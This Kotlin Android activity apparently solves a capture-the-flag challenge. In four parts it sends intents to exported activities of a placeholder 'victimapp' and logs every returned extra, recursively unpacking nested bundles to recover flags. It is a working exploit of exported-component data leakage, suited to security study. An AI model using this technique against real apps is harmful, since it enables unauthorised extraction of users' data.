package com.ennio.justask

import android.app.Activity
import android.content.ComponentName
import android.content.ContentValues.TAG
import android.content.Intent
import android.net.Uri
import android.nfc.Tag
import android.os.Bundle
import android.util.Log
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.ActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_main)
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main)) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        val resultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            Log.d("get", result.data.toString())
            val intent: Intent? = result.data
            val resultCode = result.resultCode
            Log.i(TAG, "Got resultCode=$resultCode")

            if(intent == null) {
                Log.i(TAG, "No result returned")
                return@registerForActivityResult
            }

            val extras: Bundle? = intent.extras
            if (extras == null || extras.isEmpty) {
                Log.i(TAG, "Intent has no extras")
            } else {
                Log.i(TAG, "Dumping extras:")
                for (key in extras.keySet()) {
                    val value = extras.getString(key)
                    Log.i(TAG, " $key -> $value")
                }
            }
        }

        val bundleResultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            Log.d("get", result.data.toString())
            val intent: Intent? = result.data
            val resultCode = result.resultCode
            Log.i(TAG, "Got resultCode=$resultCode")

            if (intent == null) {
                Log.i(TAG, "No result returned")
                return@registerForActivityResult
            }

            val extras: Bundle? = intent.extras
            if (extras == null || extras.isEmpty) {
                Log.i(TAG, "Intent has no extras")
            } else {
                Log.i(TAG, "Dumping extras:")
                getFlag(extras)
            }
        }

        // FIRST PART

        val intent1 = Intent().apply {
            component = ComponentName("com.example.victimapp", "com.example.victimapp.PartOne")
        }
        resultLauncher.launch(intent1)

        // SECOND PART

        val intent2 = Intent().apply {
            action = "com.example.victimapp.intent.action.JUSTASK"
            `package` = "com.example.victimapp"
        }
        resultLauncher.launch(intent2)

        // THIRD PART

        val intent3 = Intent().apply {
            component = ComponentName("com.example.victimapp", "com.example.victimapp.PartThree")
        }
        resultLauncher.launch(intent3)


        // FOURTH PART

        val intent4 = Intent().apply {
            action = "com.example.victimapp.intent.action.JUSTASKBUTNOTSOSIMPLE"
            `package` = "com.example.victimapp"
        }
        bundleResultLauncher.launch(intent4)
    }

    private fun getFlag(bundle: Bundle) {
        for (key in bundle.keySet()) {
            val value = bundle.get(key)
            when(value) {
                is Bundle -> {
                    Log.i(TAG, "$key -> $value")
                    getFlag(value)
                }
                is String -> {
                    Log.i(TAG, "$key -> $value")
                }
            }
        }
    }
}